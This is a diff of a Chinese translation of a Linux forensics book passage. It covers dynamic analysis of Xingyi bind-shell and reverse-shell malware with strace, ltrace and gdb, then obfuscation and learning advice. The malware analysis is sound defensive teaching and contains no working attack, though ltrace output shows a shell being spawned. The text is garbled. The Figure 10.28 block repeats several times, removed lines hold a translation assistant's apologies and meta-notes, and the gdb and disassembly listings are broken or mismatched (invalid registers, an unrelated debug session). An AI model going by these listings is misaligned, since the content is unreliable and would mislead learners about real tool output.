-在移动指令中，还有一条奇怪的指令 `xor eax,eax`。按位异或 (XOR) 运算符比较两个数中的每一位，如果输入值中其中一个（但不是两个）在该位置为 1，则对应的位结果为 1。任何数字与自身进行异或的效果等于将数字置 0。因此，`xor eax,eax` 等同于 `mov eax,0x0`。做过任何 Shell 编码的读者会意识到使用 XOR 是更优的，因为它可以防止零字节（在很多情况下被解释为 NULL）出现在你正尝试注入的代码中。
+在移动指令中，还有一条奇怪的指令 `xor eax,eax`。按位异或 `XOR` 运算符比较两个数中的每一位，如果输入值中其中一个（但不是两个）在该位置为 1，则对应的位结果为 1。任何数字与自身进行异或的效果等于将数字置 0。因此，`xor eax,eax` 等同于 `mov eax,0x0`。做过任何 Shell 编码的读者会意识到使用 XOR 是更优的，因为它可以防止零字节（在很多情况下被解释为 NULL）出现在你正尝试注入的代码中。
 
-在移动指令块之后，我们使用 call 指令。在高级语言中，调用函数并传递一堆参数非常简单。然而，有一种约定规定了参数如何进入和离开函数。由于各种技术原因，根据所调用的函数类型使用多种调用约定。32 位系统通常在栈上传递参数（顺序从右到左）。64 位系统通常在寄存器 RDI, RSI, RDX, RCX, R8, R9 中传递参数，并将任何额外的参数放在栈上（顺序从右到左）。返回值分别存储在 32 位和 64 位系统的 EAX/EDX 和 RAX/RDX 中。存在多种调用约定的原因之一是某些接受可变参数的函数（如 printf）需要不同的调用约定，在这种约定中，调用者必须执行清理工作，因为调用者不知道将传递什么进入函数。
-
-
-
+在移动指令块之后，我们使用 `call` 指令。在高级语言中，调用函数并传递一堆参数非常简单。然而，有一种约定规定了参数如何进入和离开函数。由于各种技术原因，根据所调用的函数类型使用多种调用约定。32 位系统通常在栈上传递参数（顺序从右到左）。64 位系统通常在寄存器 `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9` 中传递参数，并将任何额外的参数放在栈上（顺序从右到左）。返回值分别存储在 32 位和 64 位系统的 `EAX/EDX` 和 `RAX/RDX` 中。存在多种调用约定的原因之一是某些接受可变参数的函数（如 `printf`）需要不同的调用约定，在这种约定中，调用者必须执行清理工作，因为调用者不知道将传递什么进入函数。
 
 ### 10.17
 
 清理主函数末尾的代码。注意，`ret` 指令之后的行可能是数据，而不是图中所示的指令。
 
-返回指令后的字节被 `objdump` 误读为机器码指令了。稍后当我们使用 GNU 调试器 (gdb) 反汇编译程序时，整个程序都将被正确反汇编译。因此，我们在这里延迟生成 `objdump` 的完整输出。
+返回指令后的字节被 `objdump` 误读为机器码指令了。稍后当我们使用 GNU 调试器 `gdb` 反汇编译程序时，整个程序都将被正确反汇编译。因此，我们在这里延迟生成 `objdump` 的完整输出。
 
 到目前为止，我们讨论的是所谓的静态分析。这本质上是对未运行程序进行的“静态分析”。虽然使用 `objdump` 等工具反汇编译可能会导致某些错误，但它是安全的，因为程序永远不会在取证工作站上执行。如果你的主要目标是判断文件是恶意的还是良，这通常足够了。你完全可以使用 `gdb` 等工具获取未知可执行文件更准确的反汇编译，但注意不要在取证工作站的调试器中运行该程序！
 
 ### 动态分析
 
-动态分析涉及实际运行程序以观察其行为。你有许多工具可以用来分析未知程序的行为。在继续之前，我们需要谈谈安全问题。考虑一下：在你的取证工作站上运行一个未知的、可能恶意的程序听起来是个好主意吗？有两个基本选择：要么使用未连接网络且仅用于检查未知文件的空闲硬件，或者使用 VirtualBox、VMware 或其他虚拟化软件设置虚拟机。
+动态分析涉及实际运行程序以观察其行为。你有许多工具可以用来分析未知程序的行为。在继续之前，我们需要谈谈安全问题。考虑一下：在你的取证工作站上运行一个未知的、可能恶意的程序听起来是个好主意吗？有两个基本选择：要么使用未连接网络且仅用于检查未知文件的空闲硬件，或者使用 `VirtualBox`、`VMware` 或其他虚拟化软件设置虚拟机。
 
 独立机器是最安全的选项。这允许你肆无忌惮地运行程序，因为你知道在完成分析后会对机器进行重装系统。虚拟化显然更方便，但如果你错误配置了虚拟机，会对你的主机产生潜在风险。如果你使用虚拟化，请确保你与虚拟机没有网络连接。此外，请注意，某些智能恶意软件会检测到自己运行在虚拟机内部并拒绝运行，或者更糟糕，尝试利用虚拟化软件的可能漏洞来攻击主机。
 
-如果你需要为虚拟机准备镜像，可以使用重新安装一个你喜欢的 Linux 发行版。如果你认为之后将调查未知二进制文件，可以考虑在安装完所有工具之后、在将任何未知文件传输到虚拟机之前，备份虚拟磁盘文件。记住，大多数虚拟化软件会安装一个连接到互联网的 NAT 网络接口，你应该禁用它！如果你真的想复制目标系统，可以从目标磁盘镜像创建虚拟机。这假设你有足够的磁盘空间、内存等。如果你使用 VirtualBox，将原始镜像转换为虚拟硬盘的命令是 `vboxmanage internalcommands convert2hdr srcformat raw -dstformat vhd <raw image> <destination vhd file>`。在虚拟机中（不带网络！）运行的 PAS 目标系统如图 10.18 所示。
+如果你需要为虚拟机准备镜像，可以使用重新安装一个你喜欢的 Linux 发行版。如果你认为之后将调查未知二进制文件，可以考虑在安装完所有工具之后、在将任何未知文件传输到虚拟机之前，备份虚拟磁盘文件。记住，大多数虚拟化软件会安装一个连接到互联网的 NAT 网络接口，你应该禁用它！如果你真的想复制目标系统，可以从目标磁盘镜像创建虚拟机。这假设你有足够的磁盘空间、内存等。如果你使用 `VirtualBox`，将原始镜像转换为虚拟硬盘的命令是 `vboxmanage internalcommands convert2hdr srcformat raw -dstformat vhd <raw image> <destination vhd file>`。在虚拟机中（不带网络！）运行的 PAS 目标系统如图 10.18 所示。
 
 ![](img/7abfab28a493757db3f096946a95ec01_376_0.png)
 
@@ -7760,9 +9123,9 @@ RIP 寄存器（或 32 位汇编中的 EIP）被称为指令指针。它指向�
 
 图 10.19
 
-在沙箱虚拟机中运行 strace 对 xingi_bindshell 的部分输出。
+在沙箱虚拟机中运行 `strace` 对 `xingi_bindshell` 的部分输出。
 
-从图 10.19 我们可以看到 C 库 (/lib/x86_64-linux-gnu/libc.so.6) 打开并读取，且该调用返回了文件句柄 3。文件被读取，其部分被映射到内存中，以便可以使用库中的某些函数。所有程序自动存在两个文件句柄 1 和 2，分别对应标准输出 (stdout) 和标准错误 (stderr)。调用 `write(1, "\n", n)` 等于在 C 程序中调用 `printf("\n")`（这正是该文件的内容）。`strace` 的输出还显示使用 `popen` 创建了管道。`Open` 代表管道打开。它用于执行命令并打开一个管道以获取命令的响应。随后的 `read` 命令的几行显示，看起来程序正尝试确定 Python 的版本。
+从图 10.19 我们可以看到 C 库 `(/lib/x86_64-linux-gnu/libc.so.6)` 打开并读取，且该调用返回了文件句柄 3。文件被读取，其部分被映射到内存中，以便可以使用库中的某些函数。所有程序自动存在两个文件句柄 1 和 2，分别对应标准输出 `stdout` 和标准错误 `stderr`。调用 `write(1, "\n", n)` 等于在 C 程序中调用 `printf("\n")`（这正是该文件的内容）。`strace` 的输出还显示使用 `popen` 创建了管道。`Open` 代表管道打开。它用于执行命令并打开一个管道以获取命令的响应。随后的 `read` 命令的几行显示，看起来程序正尝试确定 Python 的版本。
 
 不要认为 `strace` 是帮助你理解程序工作的完美工具。查看程序行为的最佳方法是通过 `gdb` 追踪它。使用 `strace` 是进入 `gdb` 之前的很好的起点。对另一个二进制文件 `xingi_rootshell` 运行 `strace` 的结果如图 10.20 所示。注意程序以“wrong password”消息终止。在静态分析期间带有“password”命令运行 `xingi_rootshell` 导致了图 10.21 所示的结果。
 
@@ -7770,34 +9133,32 @@ RIP 寄存器（或 32 位汇编中的 EIP）被称为指令指针。它指向�
 
 图 10.20
 
-无密码的情况下运行 strace 对 xingi_rootshell。
+无密码的情况下运行 `strace` 对 `xingi_rootshell`。
 
 ![](img/7abfab28a493757db3f096946a95ec01_378_1.png)
 
 图 10.21
 
-对 `xingyi_reverse_shell` 运行 strace 生成了错误。如果我们在命令中添加 IP 地址 127.0.0.1，它将成功并在端口 7777 上创建一个监听的进程，如图 10.22 所示。
+对 `xingyi_reverse_shell` 运行 `strace` 生成了错误。如果我们在命令中添加 IP 地址 `127.0.0.1`，它将成功并在端口 `7777` 上创建一个监听的进程，如图 10.22 所示。
 
 ![](img/7abfab28a493757db3f096946a95ec01_379_0.png)
 
 图 10.22
 
-对 xingyi_reverse_shell 127.0.0.1 运行 strace。创建了一个监听端口 7777 的进程。
+对 `xingyi_reverse_shell 127.0.0.1` 运行 `strace`。创建了一个监听端口 `7777` 的进程。
 
 # 追踪库调用
 
 `ltrace` 工具的功能与 `strace` ，只不过用于追踪库调用而不是系统调用。对 `xingyi_bindshell` 运行 `ltrace` 的结果如图 10.23 所示。我们可以看到 C 库被加载，分配了 257 字节内存并填充为零，调用 `popen` 获取版本，返回为 2，`strcmp` 被调用并返回 0，`fork` 用于创建新进程，程序退出。
 
-```
+
+
 ptrace(exec, xingyi_bindshell,
+
 - execve("/bin/sh", {"/bin/sh"}, 0x7ffee60d0, 0x00000000)
 ```
 
 图 10.23 ltrace 对 xingyi_bindshell。
-
-
-
-
 
 # 图 10.24
 
@@ -7811,163 +9172,160 @@ ptrace(exec, xingyi_bindshell,
 
 此时，我们已经获取了足够关于这些二进制文件的信息，可以断定它们是恶意的。我们知道它们是监听套字（sockets）、壳（shells），并且具有其他常见的恶意软件特征。如果我们想学习更多，是时候使用调试器了。
 
-### 使用 GNU 调试器进行逆向工程
+## 使用 GNU 调试器进行逆向工程
 
-GNU 调试器 gdb 是 Linux 程序员的标准调试器。它非常强大。遗憾的是，这种强大也伴随着一定的学习曲线。虽然有一些 gdb 的图形用户界面（GUI）前端，但该工具本身是基于命令行的。我在书中只会介绍重点内容。对于关于如何充分利用 gdb 的完整课程，我推荐 PentesterAcademy.com 上的 GNU 调试器 Megaprinter 课程（http://www.pentesteracademy.com/course?id=4）。
+GNU 调试器 `gdb` 是 Linux 程序员的标准调试器。它非常强大。遗憾的是，这种强大也伴随着一定的学习曲线。虽然有一些 `gdb` 的图形用户界面（GUI）前端，但该工具本身是基于命令行的。我在书中只会介绍重点内容。对于关于如何充分利用 `gdb` 的完整课程，我推荐 PentesterAcademy.com 上的 GNU 调试器 Megaprinter 课程（http://www.pentesteracademy.com/course?id=4）。
 
-在我们开始之前，我想指出 gdb 的设计初衷并不是用于逆向工程。还有其他专门为逆向工程定制的调试器。然而，由于 IDA Pro 的起价超过 1100 美元，它并不适合业余的逆向工程师使用。
+在我们开始之前，我想指出 `gdb` 的设计初衷并不是用于逆向工程。还有其他专门为逆向工程定制的调试器。然而，由于 IDA Pro 的起价超过 1100 美元，它并不适合业余的逆向工程师使用。
 
-要将程序加载到 gdb 中，只需输入 `gdb <executable>`。你将会看到一些关于你的文件信息，例如它是否包含调试符号（你检查的大多数文件可能包含额外的调试信息）、一条提示输入“help”获取帮助的语句，然后是一个 (gdb) 提示符。输入 help 将进入如图 10.26 所示的屏幕。
+要将程序加载到 `gdb` 中，只需输入 `gdb <executable>`。你将会看到一些关于你的文件信息，例如它是否包含调试符号（你检查的大多数文件可能包含额外的调试信息）、一条提示输入“help”获取帮助的语句，然后是一个 `(gdb)` 提示符。输入 `help` 将进入如图 10.26 所示的屏幕。
 
 ![](img/7abfab28a493757db3f096946a95ec01_382_0.png)
 
 图 10.26
 
-gdb 主帮助界面。
-如果你在 gdb 中输入 `help info`，你将得到调试器报告的内容长列表。其中一项是函数（functions）。在调试器中加载 xingyi bindshell 的情况下运行 `info functions` 会产生一个长列表，其中部分内容如图 10.27 所示。函数与其地址一起显示。顺便提一下，只要 gdb 命令不产生，就可以缩写。输入 `inf fun` 将返回相同的结果。
+`gdb` 主帮助界面。
+如果你在 `gdb` 中输入 `help info`，你将得到调试器报告的内容长列表。其中一项是函数（functions）。在调试器中加载 xingyi bindshell 的情况下运行 `info functions` 会产生一个长列表，其中部分内容如图 10.27 所示。函数与其地址一起显示。顺便提一下，只要 `gdb` 命令不产生歧义，就可以缩写。输入 `inf fun` 将返回相同的结果。
 
 ```
 00000000 <00001000>: start main(int)
+
 00000000 <00001000>: push   %rbp
+
 00000005 <00001005>: mov    %rbp,%rsp
+
 00000008 <00001008>: push   %rbx
+
 0000000a <0000100a>: mov    %rbx,%rbp
+
 0000000d <0000100d>: mov    -0x8(%rbp),%rbx
+
 00000010 <00001010>: mov    -0x4(%rbp),%edi
+
 00000013 <00001013>: mov    $0x0,%exx
+
 00000016 <00001016>: call   0x401030 <puts>
+
 0000001b <0000101b>: mov    %eax,%eax
+
 0000001e <0000101e>: leave
+
 pop    %rbp
+
 00000021 <00001021>: mov    %rsp
+
 00000022 <00001022>: ret
 ```
 
 ### 图 10.27
 
-在 gdb 中运行 info functions 的部分结果。
+在 `gdb` 中运行 `info functions` 的部分结果。
 
-如前所述，gdb 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 main 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 objdump 输出不同，main 函数结束于 0x401312。
+如前所述，`gdb` 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 `main` 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 `objdump` 输出不同，`main` 函数结束于 0x401312。
 
 ```
 (gdb) file main.c
+
 (gdb) break main
+
 Breakpoint 1 at 0x1149:5 in file main.c.
+
 Remote debugging 1.
+
 (gdb) run
+
 Starting program: /home/sandbox/main 
 
 Breakpoint 0x0000000000401149, main () at main.c:5
+
 5	int x = 0;
+
 (gdb) step
+
 0x0000000000401149, main () at main.c:5
+
 5	int x = 0;
+
 (gdb) print x
+
 $1 = 10
 ```
 
 ### 图 10.28
 
-在 gdb 中反汇编 main 的部分结果
+在 `gdb` 中反汇编 `main` 的部分结果
 
-如前所述，gdb 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 main 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 objdump 输出不同，main 函数结束于 0x401312。
+如前所述，`gdb` 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 `main` 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 `objdump` 输出不同，`main` 函数结束于 0x401312。
 
 （注：此处原文原文
 
-在 gdb 中反汇编 main 的部分结果。
+在 `gdb` 中反汇编 `main` 的部分结果。
 
-如前所述，gdb 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 main 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 objdump 输出不同，main 函数结束于 0x401312。
-
-```
-(gdb) file main.c
-(gdb) break main
-Breakpoint 1 at 0x1149:5 in file main.c.
-Remote debugging 1.
-(gdb) run
-Starting program: /home/sandbox/main 
-
-Breakpoint 0x0000000000401149, main () at main.c:5
-5	int x = 0;
-(gdb) step
-0x0000000000401149, main () at main.c:5
-5	int x = 0;
-(gdb) print x
-$1 = 10
-```
-
-### 图 10.28
-
-在 gdb 中反汇编 main 的部分结果
-
-如前所述，gdb 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 main 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 objdump 输出不同，main 函数结束于 0x401312。
-
-（注：原文原文
-
-在 gdb 中反汇编 main 的部分结果
-
-（抱歉，由于输入文本中出现了逻辑重复，以下是修正后的完整后续翻译：）
-
-[content]
-
-### 图 10.28
-
-在 gdb 中反汇编 main 的部分结果
-
-如前所述，gdb 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 main 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 objdump 输出不同，main 函数结束于 0x401312。
+如前所述，`gdb` 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 `main` 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 `objdump` 输出不同，`main` 函数结束于 0x401312。
 
 ```
 (gdb) file main.c
+
 (gdb) break main
+
 Breakpoint 1 at 0x1149:5 in file main.c.
+
 Remote debugging 1.
+
 (gdb) run
+
 Starting program: /home/sandbox/main 
 
 Breakpoint 0x0000000000401149, main () at main.c:5
+
 5	int x = 0;
+
 (gdb) step
+
 0x0000000000401149, main () at main.c:5
+
 5	int x = 0;
+
 (gdb) print x
+
 $1 = 10
 ```
 
-（注：由于提供的待译文本从 FIGURE 10.28 之后开始大量重复的文本块，根据“一定不要重复输出原文”的原则，此处仅翻译了第一遍出现的部分。若需后续重复部分的翻译请告知。）
 
-[/content]
 
-***
-
-**说明：** 您提供的待译文本在 `# FIGURE 10.28` 之后存在大量完全重复的段落。根据您的要求“**一定不要重复输出原文**”，我仅翻译了第一次出现的该部分。如果需要我翻译所有重复内容，请告知。
-
-*(由于原始文本中从 Figure 10.28 之后的内容是多次重复的，为了保持输出简洁并符合您的指令，我合并并翻译了该逻辑的第一次出现。)*
-
-**重新为您提供干净的 10.28 之后翻译：**
-
-[content]
 ### 图 10.28
 
-在 gdb 中反汇编 main 的部分结果。
+在 `gdb` 中反汇编 `main` 的部分结果
 
-如前所述，gdb 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 main 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 objdump 输出不同，main 函数结束于 0x401312。
+如前所述，`gdb` 可用于反汇编程序。反汇编函数的命令仅为 `disassemble <function name or address>`，例如 `disassemble main`。该命令可以简化为 `disas`。在运行此命令之前，你可能希望从默认的 AT&T 语法切换到更常见的 Intel 语法。要这样做，请命令 `set disassembly-flavor intel`。反汇编 `main` 的部分结果如图 10.28 所示。注意，与图 10.15 所示的 `objdump` 输出不同，`main` 函数结束于 `0x401312`。
 
 ```
 (gdb) file main.c
+
 (gdb) break main
+
 Breakpoint 1 at 0x1149:5 in file main.c.
+
 Remote debugging 1.
+
 (gdb) run
+
 Starting program: /home/sandbox/main 
 
 Breakpoint 0x0000000000401149, main () at main.c:5
+
 5	int x = 0;
+
 (gdb) step
+
 0x0000000000401149, main () at main.c:5
+
 5	int x = 0;
+
 (gdb) print x
+
 $1 = 10
 ```
-
 
 
 
@@ -7983,27 +9341,27 @@ $1 = 10
 
 那么 `xingyi_reverse_shell` 呢？我们可以通过相同的步骤进行快速分析。首先，我们用 `gdb xingyi_reverse_shell` 将其加载。接下来，我们用 `break main` 在 `main` 函数中设置断点。可选地，我们通过 `set disassembly-flavor intel` 将反汇编格式设置为 Intel。我们可以使用带参数 `run 127.0.0.1` 运行程序。在这个阶段，程序应该刚好停在 `main` 函数内部，输入 `disassemble` 将产生如图 10.36 所示的输出。
 
-### 10.36
+### 图 10.36
 
 在 gdb 中反汇编 `xingyi_reverse_shell` 中的 `main` 函数。
 
-通过分析图 10.36 中的反汇编代码，我们可以看到这个函数相当简单。栈上分配了 32 (0x20) 字节的空间。命令行参数的数量和第一个参数分别存储在 `[RBP - 0x14]` 和 `[RBP-0x20]` 中。如果命令行参数的数量大于 1（回 `print_usage`），第二个命令行参数的地址（位于列表起始位置 + 0x8，以跳过第一个参数的 8 字节指针）会被加载到 RDI 和 `validate_ip4_octet` 中。如果我们事先不知道这个命令行参数应该是一个 IP 地址，这段代码片段将帮助我们发现这一点。再次，如果二进制文件被剥离了，我们就需要多费一番，调查 `0x400AC5` 处的函数以确定它的作用。如果此函数没有返回成功，则执行 `_print_usage`。
+通过分析图 10.36 中的反汇编代码，我们可以看到这个函数相当简单。栈上分配了 32 (`0x20`) 字节的空间。命令行参数的数量和第一个参数分别存储在 `[RBP - 0x14]` 和 `[RBP-0x20]` 中。如果命令行参数的数量大于 1（回 `print_usage`），第二个命令行参数的地址（位于列表起始位置 + 0x8，以跳过第一个参数的 8 字节指针）会被加载到 RDI 和 `validate_ip4_octet` 中。如果我们事先不知道这个命令行参数应该是一个 IP 地址，这段代码片段将帮助我们发现这一点。再次，如果二进制文件被剥离了，我们就需要多费一番，调查 `0x400AC5` 处的函数以确定它的作用。如果此函数没有返回成功，则执行 `_print_usage`。
 
 一切仍然良好，`daemonize` 函数很清晰。再次，如果二进制文件被剥离了这个描述性名称，我们就必须更努力一点，深入研究 `daemonize` 函数以确定其目的。我们看到 RIP 引用了另一个地址。这里 `write_pid_to_file` 的参数从地址 `0x6020B8` 加载。运行命令 `x/s *0x60200b8` 可以显示该字符串为 `/tmp/xingyi_reverse_pid`。这以及剩余的反汇编代码可能显示在图 10.37 中。
 
 ![](img/7abfab28a493757db3f096946a95ec01_392_0.png)
 
-### 10.37
+### 图 10.37
 
 `xingyi_reverse_shell` 反汇编的后半部分。
 
-我们可以看到 `fwrite` 被调用了几次，并且调用了 `_log_file`。如果我们检查图 10.37 中引用的值，会发现 `0x620B0` 包含值 0x51E61 (7777)，`0x620C8` 包含字符串 "tmp/xingyi_reverse.port"。确定这三个二进制文件的作用相当容易，因为作者没有尝试混淆代码。文件名、函数名、变量名等让这个过程变得简单。如果恶意软件作者试图让事情难以检测和/或理解呢？
+我们可以看到 `fwrite` 被调用了几次，并且调用了 `_log_file`。如果我们检查图 10.37 中引用的值，会发现 `0x620B0` 包含值 `0x51E61` (7777)，`0x620C8` 包含字符串 `"tmp/xingyi_reverse.port"`。确定这三个二进制文件的作用相当容易，因为作者没有尝试混淆代码。文件名、函数名、变量名等让这个过程变得简单。如果恶意软件作者试图让事情难以检测和/或理解呢？
 
 # 混淆 (OBFUSCATION)
 
 恶意软件作者会使用多种方法来混淆程序。其复杂程度差异很大。减慢逆向工程师速度最普通的方法之一是使用加壳（packer）。加壳可以用于压缩磁盘上的二进制文件，并在某些情况下加速加载过程。加壳压缩现有的程序，并插入可执行代码来反转该过程并将程序解压到内存。
 
-可执行文件终极壳 (UPX) 是一种非常流行的跨平台壳器，可以在 http://upx.sourceforge.net 获取。如果执行命令 `grep UPX <file>` 生成了任何匹配结果，那么你可能正在处理一个由 UPX 加壳的文件。如果有匹配结果，下载 UPX 包并使用 `-d` 选项解压文件。用 UPX 加壳的文件的前几个字节如图 10.38 所示。
+可执行文件终极壳 `UPX` 是一种非常流行的跨平台壳器，可以在 `http://upx.sourceforge.net` 获取。如果执行命令 `grep UPX <file>` 生成了任何匹配结果，那么你可能正在处理一个由 UPX 加壳的文件。如果有匹配结果，下载 UPX 包并使用 `-d` 选项解压文件。用 UPX 加壳的文件的前几个字节如图 10.38 所示。
 
 # 图 10.38
 
@@ -8011,7 +9369,7 @@ $1 = 10
 
 在过去，聪明的作者可能会编写随执行而改变的自修改代码。这在没有任何内存保护的 DOS 系统上很容易实现。在现代世界，即使是 Windows 也会将可执行内存块标记为只读。
 
-# 第十一章 章
+# 第十一章
 
 ## 前方的路
 
@@ -8031,12 +9389,9 @@ $1 = 10
 
 不要单打斗。成为社区的一部分。如果你想严格地限制在取证领域，这说起来做起来难。拥有活跃本地分会网络的专业取证组织很罕见。我个人并不认为这是一件坏事。我认为接入更广泛的信息安全社区要好得多。想看，拥有一些如攻击性安全（offensive security）等专家的朋友对你的未来有所帮助。你还会在这个社区中发现许多 Linux 领域的专家。
 
-一个很好的起点可能是当地的 DEFCON 小组。小组列表（根据电话区号命名）可以在 https://www.defcon.org/html/defcon-groups/dc-index.html 找到。如果你住在大城市，你可能会发现你所在地区有一个 DEFCON 小组。如果你不住在大城市呢？给附近一些小组的联系人发电子邮件，询问他们是否知道你所在地区的任何活动，特别是与取证相关的活动。
+一个很好的起点可能是当地的 DEFCON 小组。小组列表（根据电话区号命名）可以在 `https://www.defcon.org/html/defcon-groups/dc-index.html` 找到。如果你住在大城市，你可能会发现你所在地区有一个 DEFCON 小组。如果你不住在大城市呢？给附近一些小组的联系人发电子邮件，询问他们是否知道你所在地区的任何活动，特别是与取证相关的活动。
 
-本地会议很棒。你可以遇到志同道合的人，而且通常此类会议很有趣。这些会议的问题在于它们往往频率很低。即使是每月一次的会议，与更大社区的互动的。这时在线社区可以产生巨大的益处。当你加入一个在线社区时，你
-
-
-可以接触到世界各地的专家，而不仅仅是居住在附近的人。
+本地会议很棒。你可以遇到志同道合的人，而且通常此类会议很有趣。这些会议的问题在于它们往往频率很低。即使是每月一次的会议，与更大社区的互动的。这时在线社区可以产生巨大的益处。当你加入一个在线社区时，你可以接触到世界各地的专家，而不仅仅是居住在附近的人。
 
 一个非常棒的在线社区是加入 [Pentester Academy](http://pentesteracademy.com)。Pentester Academy 提供的不仅仅是几个讨论论坛，还提供了与本书以及其出版分支出版的其他书籍相关的下载内容、作者互动，以及一个不断增长的课程库。Pentester Academy 的另一个优点是，它并不局限于取证这一子领域。
 
@@ -8051,17 +9406,17 @@ $1 = 10
 - Shell 脚本 - 有时 Python 大材小用，或者开销太大。
 - 汇编 - 深入理解汇编有助于你理解一切。
 
-学习 Linux 的最佳方法是什么？使用它。真正地使用它。每天把它作为你的主操作系统运行。不要只是偶尔运行一个 Linux 发行版。在你的笔记本电脑上安装 Linux。你永远无法从运行中的发行版中学学会 Linux 管理。就我个人而言，我会避开专门用于取证的发行版，比如 SIFT。从长远来看，安装标准版本的 Linux 并添加自己的工具会更好。如果你不确定使用什么，Ubuntu 家族的某些成员是你需要支持时可以寻求的大型社区。如果你在运行 Linux 几年后，决定想更深层次地学习 Linux，可以考虑在取证工作站以外的设备上安装 Gent Linux (http://gentoo.org)。Gentoo 是一个基于源码的发行版，安装它既是一个教育过程，又极其令人沮丧。
+学习 Linux 的最佳方法是什么？使用它。真正地使用它。每天把它作为你的主操作系统运行。不要只是偶尔运行一个 Linux 发行版。在你的笔记本电脑上安装 Linux。你永远无法从运行中的发行版中学学会 Linux 管理。就我个人而言，我会避开专门用于取证的发行版，比如 SIFT。从长远来看，安装标准版本的 Linux 并添加自己的工具会更好。如果你不确定使用什么，Ubuntu 家族的某些成员是你需要支持时可以寻求的大型社区。如果你在运行 Linux 几年后，决定想更深层次地学习 Linux，可以考虑在取证工作站以外的设备上安装 Gent Linux (`http://gentoo.org`)。Gentoo 是一个基于源码的发行版，安装它既是一个教育过程，又极其令人沮丧。
 
 就像 Linux 一样，学习 Python 的最佳方法真的是真正使用它。有很多声称能教你 Python 的书。你应该首先意识到，Python 可以作为脚本语言，也可以作为编程语言。大多数可用书籍将 Python 视为编程语言。我所说的编程语言是指编写大型计算机程序的语言（例如文字处理器或游戏）。在我看来，有其他语言更适合此类任务。
 
-学习 Python 脚本需要一种非常注重实践的方法。这正是你在 Pentester Academy 的 Python 课程（http://www.pentesteracademy.com/course?id=1）中会发现的。考虑到这本书是由 Pentester Academy 出版的，有些人可能会对这个建议产生怀疑。在我为 Pentester Academy 制作第一个视频之前，甚至在还没有这本书构想之前，我就一直在推荐这门课程了，其他资源还包括 http://learnpythonthardway.org、http://www.codecademy.com/en/tracks/python，以及 http://learnpython.org。
+学习 Python 脚本需要一种非常注重实践的方法。这正是你在 Pentester Academy 的 Python 课程（`http://www.pentesteracademy.com/course?id=1`）中会发现的。考虑到这本书是由 Pentester Academy 出版的，有些人可能会对这个建议产生怀疑。在我为 Pentester Academy 制作第一个视频之前，甚至在还没有这本书构想之前，我就一直在推荐这门课程了，其他资源还包括 `http://learnpythonthardway.org`、`http://www.codecademy.com/en/tracks/python`，以及 `http://learnpython.org`。
 
-由于我可能喜欢 Python，但有时编写脚本会更合适。通常情况下，当你想要运行某些程序和/或不想进行大量计算时，脚本是一个很好的选择。用于学习脚本的一些在线资源包括 http://linuxcommand.org、http://linuxconfig.org/bashscript-tutorial，以及 http://tdlp.org/HOWTO/Bash-Prog-Intro-HOWTO.html。我推荐的两本关于 Shell 脚本的书是 Taylor 写的《Wicked Cool Shell Scripts》（第二版计划于 2015 年 9 月出版）以及 Arnold Robins 和 Nelson H.F. Bebe 写的《Classic Shell Scripting》。后者于 2005 年出版，但仍然是该主题最好的书籍之一。
+由于我可能喜欢 Python，但有时编写脚本会更合适。通常情况下，当你想要运行某些程序和/或不想进行大量计算时，脚本是一个很好的选择。用于学习脚本的一些在线资源包括 `http://linuxcommand.org`、`http://linuxconfig.org/bashscript-tutorial`，以及 `http://tdlp.org/HOWTO/Bash-Prog-Intro-HOWTO.html`。我推荐的两本关于 Shell 脚本的书是 Taylor 写的《Wicked Cool Shell Scripts》（第二版计划于 2015 年 9 月出版）以及 Arnold Robins 和 Nelson H.F. Bebe 写的《Classic Shell Scripting》。后者于 2005 年出版，但仍然是该主题最好的书籍之一。
 
